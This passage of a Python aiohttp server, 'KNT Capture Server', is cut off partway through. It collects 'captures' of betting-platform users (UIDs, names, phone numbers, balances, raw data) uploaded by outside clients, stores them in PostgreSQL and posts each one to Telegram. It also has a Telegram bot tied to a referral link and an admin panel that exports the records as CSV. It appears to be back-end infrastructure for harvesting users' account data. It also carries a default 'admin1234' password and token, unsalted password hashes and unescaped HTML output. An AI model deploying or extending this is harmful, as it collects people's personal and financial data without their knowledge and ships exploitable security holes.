#!/usr/bin/env python3
"""
KNT Capture Server v3 -- PostgreSQL
"""

import os
import time
import asyncio
import hashlib
import secrets

import asyncpg
from aiohttp import web

# ---- CONFIG -----------------------------------------------------------------

INGEST_TOKEN = os.environ.get("INGEST_TOKEN", "knt-capture-CHANGE-THIS-9f2b7c3d4e")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin1234")
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
DATABASE_URL = os.environ.get("DATABASE_URL", "")
MAX_PER_REQUEST = 500

SESSIONS = {}
POOL = None


# ---- DB POOL ----------------------------------------------------------------

async def init_pool():
    global POOL
    url = DATABASE_URL
    # Render gives postgres://... but asyncpg needs postgresql://
    if url.startswith("postgres://"):
        url = url.replace("postgres://", "postgresql://", 1)
    POOL = await asyncpg.create_pool(url, min_size=1, max_size=8)


async def init_db():
    async with POOL.acquire() as c:
        await c.execute("""
        CREATE TABLE IF NOT EXISTS captures (
            id           SERIAL PRIMARY KEY,
            device_id    TEXT,
            uid          TEXT,
            user_name    TEXT,
            nick_name    TEXT,
            phone        TEXT,
            balance      TEXT,
            amount_code  TEXT,
            host         TEXT,
            source_url   TEXT,
            raw          TEXT,
            captured_at  BIGINT,
            received_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            note         TEXT,
            tag          TEXT,
            UNIQUE(device_id, uid)
        );
        CREATE INDEX IF NOT EXISTS idx_cap_uid ON captures(uid);

        CREATE TABLE IF NOT EXISTS subordinates (
            id           SERIAL PRIMARY KEY,
            owner_uid    TEXT,
            uid          TEXT UNIQUE,
            user_name    TEXT,
            phone        TEXT,
            balance      TEXT,
            raw          TEXT,
            note         TEXT,
            tag          TEXT,
            captured_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE INDEX IF NOT EXISTS idx_sub_uid ON subordinates(uid);

        CREATE TABLE IF NOT EXISTS bot_users (
            telegram_id  BIGINT PRIMARY KEY,
            uid          TEXT,
            first_seen   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_check   TIMESTAMP,
            note         TEXT
        );

        CREATE TABLE IF NOT EXISTS query_history (
            id           SERIAL PRIMARY KEY,
            telegram_id  BIGINT,
            query_uid    TEXT,
            result       TEXT,
            queried_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE INDEX IF NOT EXISTS idx_qh_uid ON query_history(query_uid);
        CREATE INDEX IF NOT EXISTS idx_qh_tg ON query_history(telegram_id);

        CREATE TABLE IF NOT EXISTS settings (
            key   TEXT PRIMARY KEY,
            value TEXT
        );

        CREATE TABLE IF NOT EXISTS blacklist (
            uid          TEXT PRIMARY KEY,
            reason       TEXT,
            added_at     TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS admins (
            username     TEXT PRIMARY KEY,
            pw_hash      TEXT,
            created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS activity_log (
            id           SERIAL PRIMARY KEY,
            admin        TEXT,
            action       TEXT,
            target       TEXT,
            ts           TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        """)

        # default settings
        defaults = [
            ("welcome_text", "✅ স্বাগতম!\n\n🆔 UID: {uid}\n👤 {name}\n💎 Balance: {balance}\n📅 Team: আমাদের আন্ডারে\n\nতুমি আমাদের টিমে আছো! 🎉"),
            ("not_found_text", "❌ UID পাওয়া যায়নি\n\n<code>{uid}</code> আমাদের টিমে নেই।\n\nRegister করতে:\n🔗 {link}"),
            ("register_url", "https://dkwin9.com/#/register?invitationCode=164651193511"),
            ("help_text", "👋 KNT\n\nতোমার UID পাঠাও — আমরা check করে বলব।\n\nRegister: /register"),
            ("blacklist_text", "🚫 দুঃখিত, এই UID banned।"),
            ("daily_report_enabled", "1"),
            ("daily_report_hour", "23"),
        ]
        for k, v in defaults:
            await c.execute("INSERT INTO settings VALUES ($1,$2) ON CONFLICT (key) DO NOTHING", k, v)

        await c.execute("INSERT INTO admins VALUES ($1,$2,CURRENT_TIMESTAMP) ON CONFLICT (username) DO NOTHING",
                        "admin", hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest())


async def setting(key, default=""):
    async with POOL.acquire() as c:
        row = await c.fetchrow("SELECT value FROM settings WHERE key=$1", key)
    return row["value"] if row else default


async def set_setting(key, value):
    async with POOL.acquire() as c:
        await c.execute("INSERT INTO settings VALUES ($1,$2) "
                        "ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value",
                        key, value)


async def log_activity(admin, action, target):
    try:
        async with POOL.acquire() as c:
            await c.execute("INSERT INTO activity_log (admin, action, target) VALUES ($1,$2,$3)",
                            admin, action, target)
    except Exception:
        pass


async def is_blacklisted(uid):
    async with POOL.acquire() as c:
        row = await c.fetchrow("SELECT 1 FROM blacklist WHERE uid=$1", uid)
    return row is not None


async def save_capture(item):
    try:
        async with POOL.acquire() as c:
            res = await c.execute("""
                INSERT INTO captures
                (device_id, uid, user_name, nick_name, phone, balance,
                 amount_code, host, source_url, raw, captured_at)
                VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)
                ON CONFLICT (device_id, uid) DO NOTHING
            """, item.get("device_id", ""), item.get("uid", ""),
                item.get("userName", ""), item.get("nickName", ""),
                item.get("phone", ""), item.get("balance", ""),
                item.get("amountOfCode", ""), item.get("host", ""),
                item.get("sourceUrl", ""), item.get("raw", ""),
                item.get("updatedAt", int(time.time() * 1000)))
            return res.endswith(" 1")
    except Exception:
        return False


async def save_subordinate(owner_uid, sub):
    try:
        async with POOL.acquire() as c:
            await c.execute("""
                INSERT INTO subordinates
                (owner_uid, uid, user_name, phone, balance, raw)
                VALUES ($1,$2,$3,$4,$5,$6)
                ON CONFLICT (uid) DO UPDATE SET
                    owner_uid = EXCLUDED.owner_uid,
                    user_name = EXCLUDED.user_name,
                    phone = EXCLUDED.phone,
                    balance = EXCLUDED.balance,
                    raw = EXCLUDED.raw
            """, owner_uid, sub.get("uid", ""), sub.get("userName", ""),
                sub.get("phone", ""), sub.get("balance", ""), sub.get("raw", ""))
        return True
    except Exception:
        return False


async def notify(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        import aiohttp
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        async with aiohttp.ClientSession() as s:
            await s.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text,
                                    "parse_mode": "HTML",
                                    "disable_web_page_preview": True},
                         timeout=aiohttp.ClientTimeout(total=8))
    except Exception:
        pass


# ---- PUBLIC ROUTES ----------------------------------------------------------

async def handle_root(req):
    return web.Response(text="KNT Capture Server v3 (Postgres)")


async def handle_health(req):
    async with POOL.acquire() as c:
        n_cap = await c.fetchval("SELECT COUNT(*) FROM captures")
        n_sub = await c.fetchval("SELECT COUNT(*) FROM subordinates")
        n_bot = await c.fetchval("SELECT COUNT(*) FROM bot_users")
        n_bl = await c.fetchval("SELECT COUNT(*) FROM blacklist")
    return web.json_response({"ok": True, "captures": n_cap,
                              "subordinates": n_sub, "bot_users": n_bot,
                              "blacklist": n_bl})


async def handle_ingest(req):
    if req.headers.get("X-Ingest-Token", "") != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    try:
        data = await req.json()
    except Exception:
        return web.json_response({"ok": False, "err": "bad json"}, status=400)
    items = data if isinstance(data, list) else (data.get("items") or data.get("captures") or [])
    items = items[:MAX_PER_REQUEST]
    saved = 0
    for it in items:
        if not isinstance(it, dict):
            continue
        if await is_blacklisted(it.get("uid", "")):
            continue
        if await save_capture(it):
            saved += 1
            asyncio.create_task(notify(
                f"🎯 <b>New Capture</b>\n🆔 <code>{it.get('uid','?')}</code>\n"
                f"👤 {it.get('userName','?')}\n💎 {it.get('balance','?')}"
            ))
    return web.json_response({"ok": True, "received": len(items), "saved": saved})


async def handle_subs_ingest(req):
    if req.headers.get("X-Ingest-Token", "") != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    try:
        data = await req.json()
    except Exception:
        return web.json_response({"ok": False, "err": "bad json"}, status=400)
    owner = data.get("owner_uid", "")
    items = (data.get("items") or [])[:MAX_PER_REQUEST]
    saved = 0
    for it in items:
        if isinstance(it, dict) and it.get("uid"):
            if await is_blacklisted(it["uid"]):
                continue
            if await save_subordinate(owner, it):
                saved += 1
    asyncio.create_task(notify(f"📡 Subordinate Sync: {saved} saved"))
    return web.json_response({"ok": True, "received": len(items), "saved": saved})


async def handle_check_uid(req):
    token = req.headers.get("X-Ingest-Token", "") or req.query.get("token", "")
    if token != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    uid = (req.query.get("uid") or "").strip()
    if not uid:
        return web.json_response({"ok": False, "err": "no uid"}, status=400)

    if await is_blacklisted(uid):
        return web.json_response({"ok": True, "found": False, "uid": uid, "blacklisted": True})

    async with POOL.acquire() as c:
        sub = await c.fetchrow("SELECT * FROM subordinates WHERE uid=$1", uid)
        cap = await c.fetchrow("SELECT * FROM captures WHERE uid=$1 ORDER BY id DESC LIMIT 1", uid)

    if not sub:
        return web.json_response({"ok": True, "found": False, "uid": uid})

    return web.json_response({
        "ok": True, "found": True, "uid": uid,
        "userName": sub["user_name"] or (cap["user_name"] if cap else "") or "",
        "phone": sub["phone"] or (cap["phone"] if cap else "") or "",
        "balance": sub["balance"] or (cap["balance"] if cap else "") or "",
        "owner": sub["owner_uid"] or "",
        "joined": sub["captured_at"].isoformat() if sub["captured_at"] else "",
    })


async def handle_query_log(req):
    if req.headers.get("X-Ingest-Token", "") != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    try:
        data = await req.json()
    except Exception:
        return web.json_response({"ok": False, "err": "bad json"}, status=400)
    tid = data.get("telegram_id", 0)
    uid = data.get("uid", "")
    result = data.get("result", "")
    async with POOL.acquire() as c:
        await c.execute("INSERT INTO query_history (telegram_id, query_uid, result) VALUES ($1,$2,$3)",
                        int(tid), uid, result)
        await c.execute("""INSERT INTO bot_users (telegram_id, uid, last_check)
                           VALUES ($1,$2,CURRENT_TIMESTAMP)
                           ON CONFLICT (telegram_id) DO UPDATE SET
                             uid = EXCLUDED.uid,
                             last_check = CURRENT_TIMESTAMP""",
                        int(tid), uid)
    return web.json_response({"ok": True})


async def handle_bot_stats(req):
    if req.query.get("token", "") != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    async with POOL.acquire() as c:
        total_q = await c.fetchval("SELECT COUNT(*) FROM query_history")
        found = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE result='found'")
        notf = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE result='not_found'")
        users = await c.fetchval("SELECT COUNT(*) FROM bot_users")
    return web.json_response({"ok": True, "total_queries": total_q,
                              "found": found, "not_found": notf, "unique_users": users})


async def handle_settings_public(req):
    if req.headers.get("X-Ingest-Token", "") != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    return web.json_response({
        "ok": True,
        "welcome_text": await setting("welcome_text"),
        "not_found_text": await setting("not_found_text"),
        "register_url": await setting("register_url"),
        "help_text": await setting("help_text"),
        "blacklist_text": await setting("blacklist_text"),
    })


# ============================================================================
# ADMIN PANEL
# ============================================================================

def check_admin(req):
    tok = req.cookies.get("knt_admin")
    if not tok:
        return None
    info = SESSIONS.get(tok)
    if not info or time.time() - info[1] > 86400 * 7:
        SESSIONS.pop(tok, None)
        return None
    return info[0]


def admin_required(handler):
    async def wrapper(req):
        u = check_admin(req)
        if not u:
            return web.HTTPFound("/admin/login")
        req["admin_user"] = u
        return await handler(req)
    return wrapper


def page(title, body, active=""):
    nav = [
        ("/admin", "📊 Dashboard", "dash"),
        ("/admin/captures", "📱 Captures", "cap"),
        ("/admin/subs", "👥 Subordinates", "sub"),
        ("/admin/users", "🤖 Bot Users", "user"),
        ("/admin/queries", "📜 Queries", "q"),
        ("/admin/blacklist", "🚫 Blacklist", "bl"),
        ("/admin/settings", "⚙ Settings", "set"),
        ("/admin/broadcast", "📢 Broadcast", "bc"),
        ("/admin/admins", "👤 Admins", "adm"),
        ("/admin/log", "📋 Log", "log"),
    ]
    nav_html = "".join(
        f'<a class="{"active" if active==k else ""}" href="{u}">{l}</a>'
        for u, l, k in nav)
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title} · KNT Admin</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:system-ui,-apple-system,sans-serif;background:#0a0f1a;color:#e2fff2}}
.nav{{background:#0c1824;padding:.8rem;display:flex;flex-wrap:wrap;gap:.4rem;border-bottom:2px solid #1effbc;position:sticky;top:0;z-index:10}}
.nav a{{color:#7ae0c4;text-decoration:none;padding:.45rem .8rem;border-radius:.4rem;font-size:.8rem;font-weight:600}}
.nav a:hover{{background:#0f2438}}
.nav a.active{{background:#1effbc;color:#02100c}}
.container{{padding:1rem;max-width:1300px;margin:0 auto}}
h1{{color:#1effbc;font-size:1.3rem;margin-bottom:1rem}}
h2{{color:#7ae0c4;font-size:.95rem;margin:1rem 0 .6rem;text-transform:uppercase;letter-spacing:1px}}
.stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:.7rem;margin-bottom:1rem}}
.stat{{background:rgba(10,20,30,.85);border:1px solid #1effbc;border-radius:.7rem;padding:.9rem;text-align:center}}
.stat .n{{font-size:1.8rem;font-weight:800;color:#c9ffff;display:block}}
.stat .l{{font-size:.7rem;color:#7ae0c4;text-transform:uppercase;letter-spacing:1px;margin-top:.3rem}}
table{{width:100%;border-collapse:collapse;background:rgba(10,20,30,.7);border-radius:.6rem;overflow:hidden;font-size:.78rem}}
th,td{{padding:.5rem .6rem;text-align:left;border-bottom:1px solid rgba(30,255,188,.15);word-break:break-all}}
th{{background:#0c1824;color:#1effbc;font-size:.68rem;text-transform:uppercase;letter-spacing:1px}}
tr:hover{{background:rgba(30,255,188,.05)}}
.btn{{display:inline-block;padding:.35rem .7rem;background:#008064;color:#e2fff2;border:none;border-radius:.4rem;cursor:pointer;font-size:.75rem;font-weight:600;text-decoration:none;margin:.12rem}}
.btn:hover{{background:#00b085}}
.btn.red{{background:#7a1f1f}}.btn.red:hover{{background:#a03030}}
.btn.blue{{background:#1e5fa4}}.btn.blue:hover{{background:#2979cc}}
.btn.yel{{background:#8a7012}}.btn.yel:hover{{background:#b39418}}
input,textarea,select{{width:100%;padding:.55rem .7rem;background:#0c1824;color:#fff;border:1px solid rgba(30,255,188,.4);border-radius:.4rem;font-size:.85rem;font-family:inherit}}
textarea{{min-height:90px;resize:vertical}}
.row{{display:flex;gap:.6rem;flex-wrap:wrap;margin-bottom:.5rem}}
.row>*{{flex:1;min-width:140px}}
.card{{background:rgba(10,20,30,.7);border:1px solid rgba(30,255,188,.3);border-radius:.7rem;padding:.9rem;margin-bottom:.9rem}}
.empty{{color:#7ae0c4;font-size:.85rem;padding:1rem;text-align:center}}
.mono{{font-family:monospace;font-size:.75rem}}
.tag{{display:inline-block;padding:.1rem .4rem;background:#1a4a3d;color:#a8ffd8;border-radius:.3rem;font-size:.7rem;margin:.1rem}}
.bar-chart{{display:flex;align-items:flex-end;gap:4px;height:80px;margin-top:.5rem}}
.bar-chart>div{{flex:1;background:linear-gradient(180deg,#1effbc,#008064);border-radius:2px 2px 0 0;min-height:2px;position:relative}}
.bar-chart>div>span{{position:absolute;bottom:-18px;left:0;right:0;text-align:center;font-size:.6rem;color:#7ae0c4}}
</style></head>
<body>
<div class="nav">{nav_html}<a href="/admin/logout" style="margin-left:auto;color:#ff8080">Logout</a></div>
<div class="container">{body}</div>
</body></html>"""


# ---- LOGIN ------------------------------------------------------------------

async def admin_login_get(req):
    if check_admin(req):
        return web.HTTPFound("/admin")
    return web.Response(text="""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Login</title><style>
body{font-family:system-ui;background:#0a0f1a;color:#e2fff2;
display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
form{background:rgba(10,20,30,.9);padding:2rem;border:1px solid #1effbc;
border-radius:1.2rem;width:320px}
h1{color:#1effbc;text-align:center;margin-top:0;font-size:1.3rem}
input{width:100%;padding:.85rem;margin:.5rem 0;background:#0c1824;
border:1px solid #1effbc;border-radius:.5rem;color:#fff;box-sizing:border-box;font-size:1rem}
button{width:100%;padding:.9rem;margin-top:1rem;background:linear-gradient(105deg,#00cf9c,#008064);
color:#02100c;font-weight:700;border:none;border-radius:.5rem;cursor:pointer;font-size:1rem}
</style></head><body>
<form method="POST" action="/admin/login">
<h1>🖤 KNT Admin</h1>
<input name="user" placeholder="username" value="admin" required>
<input name="pw" type="password" placeholder="password" required autofocus>
<button>Login</button>
</form></body></html>""", content_type="text/html")


async def admin_login_post(req):
    data = await req.post()
    user = data.get("user", "admin").strip()
    pw = data.get("pw", "")
    pw_hash = hashlib.sha256(pw.encode()).hexdigest()
    async with POOL.acquire() as c:
        row = await c.fetchrow("SELECT * FROM admins WHERE username=$1", user)
    if not row or row["pw_hash"] != pw_hash:
        return web.Response(text="Wrong. <a href='/admin/login'>Try again</a>",
                            content_type="text/html", status=401)
    tok = secrets.token_urlsafe(24)
    SESSIONS[tok] = (user, time.time())
    resp = web.HTTPFound("/admin")
    resp.set_cookie("knt_admin", tok, max_age=86400 * 7, httponly=True)
    await log_activity(user, "login", "")
    return resp


async def admin_logout(req):
    tok = req.cookies.get("knt_admin")
    if tok:
        SESSIONS.pop(tok, None)
    resp = web.HTTPFound("/admin/login")
    resp.del_cookie("knt_admin")
    return resp


# ---- DASHBOARD --------------------------------------------------------------

@admin_required
async def admin_dashboard(req):
    async with POOL.acquire() as c:
        n_cap = await c.fetchval("SELECT COUNT(*) FROM captures")
        n_sub = await c.fetchval("SELECT COUNT(*) FROM subordinates")
        n_bot = await c.fetchval("SELECT COUNT(*) FROM bot_users")
        n_q = await c.fetchval("SELECT COUNT(*) FROM query_history")
        n_found = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE result='found'")
        n_not = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE result='not_found'")
        n_bl = await c.fetchval("SELECT COUNT(*) FROM blacklist")
        recent = await c.fetch("SELECT * FROM query_history ORDER BY id DESC LIMIT 15")
        chart = await c.fetch("""
            SELECT date(queried_at) d, COUNT(*) cnt FROM query_history
            WHERE queried_at >= CURRENT_DATE - INTERVAL '7 days'
            GROUP BY d ORDER BY d
        """)

    days = {str(r["d"]): r["cnt"] for r in chart}
    maxv = max(days.values()) if days else 1
    bars = ""
    for i in range(6, -1, -1):
        t = time.time() - i * 86400
        day = time.strftime("%Y-%m-%d", time.localtime(t))
        v = days.get(day, 0)
        h = int((v / max(maxv, 1)) * 60)
        bars += f'<div style="height:{max(h,2)}px"><span>{day[5:]}</span></div>'

    rows = ""
    for r in recent:
        rows += f"""<tr>
            <td><code>{r['telegram_id']}</code></td>
            <td><code>{r['query_uid']}</code></td>
            <td>{'✅' if r['result']=='found' else '❌'}</td>
            <td class="mono">{r['queried_at']}</td></tr>"""
    if not rows:
        rows = '<tr><td colspan="4" class="empty">No queries yet</td></tr>'

    body = f"""
    <h1>📊 Dashboard</h1>
    <div class="stats">
        <div class="stat"><span class="n">{n_cap}</span><div class="l">Captures</div></div>
        <div class="stat"><span class="n">{n_sub}</span><div class="l">Subordinates</div></div>
        <div class="stat"><span class="n">{n_bot}</span><div class="l">Bot Users</div></div>
        <div class="stat"><span class="n">{n_q}</span><div class="l">Queries</div></div>
        <div class="stat"><span class="n">{n_found}</span><div class="l">Found</div></div>
        <div class="stat"><span class="n">{n_not}</span><div class="l">Not Found</div></div>
        <div class="stat"><span class="n">{n_bl}</span><div class="l">Blacklisted</div></div>
    </div>
    <h2>Queries Last 7 Days</h2>
    <div class="card"><div class="bar-chart">{bars}</div><div style="height:20px"></div></div>
    <h2>Recent Queries</h2>
    <table><tr><th>Telegram ID</th><th>UID</th><th>Result</th><th>Time</th></tr>{rows}</table>
    """
    return web.Response(text=page("Dashboard", body, "dash"), content_type="text/html")


# ---- CAPTURES ---------------------------------------------------------------

@admin_required
async def admin_captures(req):
    q = req.query.get("q", "").strip()
    async with POOL.acquire() as c:
        if q:
            rows = await c.fetch("""SELECT * FROM captures
                WHERE uid LIKE $1 OR user_name LIKE $1 OR device_id LIKE $1
                ORDER BY id DESC LIMIT 300""", f"%{q}%")
        else:
            rows = await c.fetch("SELECT * FROM captures ORDER BY id DESC LIMIT 300")

    body = f"""<h1>📱 Captures</h1>
    <div class="card">
        <form method="GET" style="display:flex;gap:.5rem">
            <input name="q" placeholder="search" value="{q}">
            <button class="btn blue" type="submit">Search</button>
            <a class="btn yel" href="/admin/captures/export">📥 CSV</a>
        </form>
    </div>
    <div class="card">
        <h2>Add</h2>
        <form method="POST" action="/admin/captures/add">
            <div class="row">
                <input name="uid" placeholder="UID" required>
                <input name="user_name" placeholder="Name">
                <input name="balance" placeholder="Balance">
                <input name="tag" placeholder="tag">
                <button class="btn blue" type="submit">Add</button>
            </div>
        </form>
    </div>
    <table><tr><th>ID</th><th>UID</th><th>Name</th><th>Balance</th><th>Tag</th><th>Time</th><th>Action</th></tr>"""
    for r in rows:
        tag = f'<span class="tag">{r["tag"]}</span>' if r["tag"] else '—'
        body += f"""<tr>
            <td>{r['id']}</td>
            <td><code>{r['uid']}</code></td>
            <td>{r['user_name'] or r['nick_name'] or '—'}</td>
            <td>{r['balance'] or '—'}</td>
            <td>{tag}</td>
            <td class="mono">{r['received_at']}</td>
            <td>
                <a class="btn yel" href="/admin/captures/edit/{r['id']}">✏</a>
                <a class="btn red" href="/admin/captures/delete/{r['id']}"
                    onclick="return confirm('delete?')">🗑</a>
            </td></tr>"""
    if not rows:
        body += '<tr><td colspan="7" class="empty">No captures</td></tr>'
    body += '</table>'
    return web.Response(text=page("Captures", body, "cap"), content_type="text/html")


@admin_required
async def admin_captures_edit(req):
    cid = int(req.match_info["id"])
    async with POOL.acquire() as c:
        r = await c.fetchrow("SELECT * FROM captures WHERE id=$1", cid)
    if not r:
        return web.HTTPFound("/admin/captures")
    body = f"""<h1>✏ Edit Capture #{cid}</h1>
    <form method="POST" action="/admin/captures/edit/{cid}">
        <div class="card">
            <div class="row"><input name="uid" value="{r['uid'] or ''}" placeholder="UID"></div>
            <div class="row"><input name="user_name" value="{r['user_name'] or ''}" placeholder="Name"></div>
            <div class="row"><input name="balance" value="{r['balance'] or ''}" placeholder="Balance"></div>
            <div class="row"><input name="tag" value="{r['tag'] or ''}" placeholder="Tag"></div>
            <div class="row"><input name="note" value="{r['note'] or ''}" placeholder="Note"></div>
            <button class="btn" type="submit">Save</button>
            <a class="btn red" href="/admin/captures">Cancel</a>
        </div>
    </form>"""
    return web.Response(text=page("Edit Capture", body, "cap"), content_type="text/html")


@admin_required
async def admin_captures_edit_post(req):
    cid = int(req.match_info["id"])
    data = await req.post()
    async with POOL.acquire() as c:
        await c.execute("""UPDATE captures SET uid=$1, user_name=$2, balance=$3,
                            tag=$4, note=$5 WHERE id=$6""",
                        data.get("uid",""), data.get("user_name",""),
                        data.get("balance",""), data.get("tag",""),
                        data.get("note",""), cid)
    await log_activity(req["admin_user"], "edit_capture", str(cid))
    return web.HTTPFound("/admin/captures")


@admin_required
async def admin_captures_delete(req):
    cid = int(req.match_info["id"])
    async with POOL.acquire() as c:
        await c.execute("DELETE FROM captures WHERE id=$1", cid)
    await log_activity(req["admin_user"], "delete_capture", str(cid))
    return web.HTTPFound("/admin/captures")


@admin_required
async def admin_captures_add(req):
    data = await req.post()
    await save_capture({
        "device_id": "manual", "uid": data.get("uid", ""),
        "userName": data.get("user_name", ""),
        "balance": data.get("balance", ""),
        "updatedAt": int(time.time() * 1000)})
    return web.HTTPFound("/admin/captures")


@admin_required
async def admin_captures_export(req):
    async with POOL.acquire() as c:
        rows = await c.fetch("SELECT uid, user_name, balance, tag, note, received_at FROM captures ORDER BY id DESC")
    csv = "uid,user_name,balance,tag,note,received_at\n"
    for r in rows:
        csv += ",".join(f'"{str(r[k] or "")}"' for k in r.keys()) + "\n"
    return web.Response(text=csv, content_type="text/csv",
                        headers={"Content-Disposition": "attachment; filename=captures.csv"})


# ---- SUBORDINATES -----------------------------------------------------------

@admin_required
async def admin_subs(req):
    q = req.query.get("q", "").strip()
    async with POOL.acquire() as c:
        if q:
            rows = await c.fetch("""SELECT * FROM subordinates
                WHERE uid LIKE $1 OR user_name LIKE $1 OR phone LIKE $1
                ORDER BY id DESC LIMIT 500""", f"%{q}%")
        else:
            rows = await c.fetch("SELECT * FROM subordinates ORDER BY id DESC LIMIT 500")

    body = f"""<h1>👥 Subordinates</h1>
    <div class="card">
        <form method="GET" style="display:flex;gap:.5rem">
            <input name="q" placeholder="search" value="{q}">
            <button class="btn blue" type="submit">Search</button>
            <a class="btn yel" href="/admin/subs/export">📥 CSV</a>
        </form>
    </div>
    <div class="card">
        <h2>Add</h2>
        <form method="POST" action="/admin/subs/add">
            <div class="row">
                <input name="uid" placeholder="UID" required>
                <input name="user_name" placeholder="Name">
                <input name="owner_uid" placeholder="Owner UID">
                <button class="btn blue" type="submit">Add</button>
            </div>
        </form>
    </div>
    <table><tr><th>UID</th><th>Name</th><th>Phone</th><th>Owner</th><th>Action</th></tr>"""
    for r in rows:
        body += f"""<tr>
            <td><code>{r['uid']}</code></td>
            <td>{r['user_name'] or '—'}</td>
            <td>{r['phone'] or '—'}</td>
            <td><code>{r['owner_uid'] or '—'}</code></td>
            <td><a class="btn red" href="/admin/subs/delete/{r['id']}"
                onclick="return confirm('delete?')">🗑</a></td></tr>"""
    if not rows:
        body += '<tr><td colspan="5" class="empty">No subordinates</td></tr>'
    body += '</table>'
    return web.Response(text=page("Subordinates", body, "sub"), content_type="text/html")


@admin_required
async def admin_subs_delete(req):
    sid = int(req.match_info["id"])
    async with POOL.acquire() as c:
        await c.execute("DELETE FROM subordinates WHERE id=$1", sid)
    return web.HTTPFound("/admin/subs")


@admin_required
async def admin_subs_add(req):
    data = await req.post()
    await save_subordinate(data.get("owner_uid", ""), {
        "uid": data.get("uid", ""), "userName": data.get("user_name", ""),
        "phone": "", "balance": "", "raw": ""})
    return web.HTTPFound("/admin/subs")


@admin_required
async def admin_subs_export(req):
    async with POOL.acquire() as c:
        rows = await c.fetch("SELECT uid, user_name, phone, owner_uid, captured_at FROM subordinates ORDER BY id DESC")
    csv = "uid,user_name,phone,owner_uid,captured_at\n"
    for r in rows:
        csv += ",".join(f'"{str(r[k] or "")}"' for k in r.keys()) + "\n"
    return web.Response(text=csv, content_type="text/csv",
                        headers={"Content-Disposition": "attachment; filename=subordinates.csv"})


# ---- BOT USERS --------------------------------------------------------------

@admin_required
async def admin_users(req):
    async with POOL.acquire() as c:
        rows = await c.fetch("SELECT * FROM bot_users ORDER BY first_seen DESC LIMIT 500")
    body = "<h1>🤖 Bot Users</h1>"
    body += '<table><tr><th>Telegram ID</th><th>UID</th><th>First</th><th>Last</th><th>Action</th></tr>'
    for r in rows:
        body += f"""<tr>
            <td><code>{r['telegram_id']}</code></td>
            <td><code>{r['uid'] or '—'}</code></td>
            <td class="mono">{r['first_seen']}</td>
            <td class="mono">{r['last_check'] or '—'}</td>
            <td><a class="btn red" href="/admin/users/delete/{r['telegram_id']}"
                onclick="return confirm('delete?')">🗑</a></td></tr>"""
    if not rows:
        body += '<tr><td colspan="5" class="empty">No users</td></tr>'
    body += '</table>'
    return web.Response(text=page("Bot Users", body, "user"), content_type="text/html")


@admin_required
async def admin_users_delete(req):
    uid = int(req.match_info["id"])
    async with POOL.acquire() as c:
        await c.execute("DELETE FROM bot_users WHERE telegram_id=$1", uid)
    return web.HTTPFound("/admin/users")


# ---- QUERIES ----------------------------------------------------------------

@admin_required
async def admin_queries(req):
    uid = req.query.get("uid", "").strip()
    async with POOL.acquire() as c:
        if uid:
            rows = await c.fetch("SELECT * FROM query_history WHERE query_uid LIKE $1 ORDER BY id DESC LIMIT 500",
                                 f"%{uid}%")
        else:
            rows = await c.fetch("SELECT * FROM query_history ORDER BY id DESC LIMIT 500")
    body = f"""<h1>📜 Query History</h1>
    <div class="card">
        <form method="GET" style="display:flex;gap:.5rem">
            <input name="uid" placeholder="filter UID" value="{uid}">
            <button class="btn blue" type="submit">Search</button>
            <a class="btn" href="/admin/queries">Clear</a>
            <a class="btn yel" href="/admin/queries/export">📥 CSV</a>
        </form>
    </div>
    <table><tr><th>Telegram ID</th><th>UID</th><th>Result</th><th>Time</th></tr>"""
    for r in rows:
        body += f"""<tr><td><code>{r['telegram_id']}</code></td>
            <td><code>{r['query_uid']}</code></td>
            <td>{'✅' if r['result']=='found' else '❌'}</td>
            <td class="mono">{r['queried_at']}</td></tr>"""
    if not rows:
        body += '<tr><td colspan="4" class="empty">No queries</td></tr>'
    body += '</table>'
    return web.Response(text=page("Queries", body, "q"), content_type="text/html")


@admin_required
async def admin_queries_export(req):
    async with POOL.acquire() as c:
        rows = await c.fetch("SELECT telegram_id, query_uid, result, queried_at FROM query_history ORDER BY id DESC")
    csv = "telegram_id,query_uid,result,queried_at\n"
    for r in rows:
        csv += ",".join(f'"{str(r[k] or "")}"' for k in r.keys()) + "\n"
    return web.Response(text=csv, content_type="text/csv",
                        headers={"Content-Disposition": "attachment; filename=queries.csv"})


# ---- BLACKLIST --------------------------------------------------------------

@admin_required
async def admin_blacklist(req):
    async with POOL.acquire() as c:
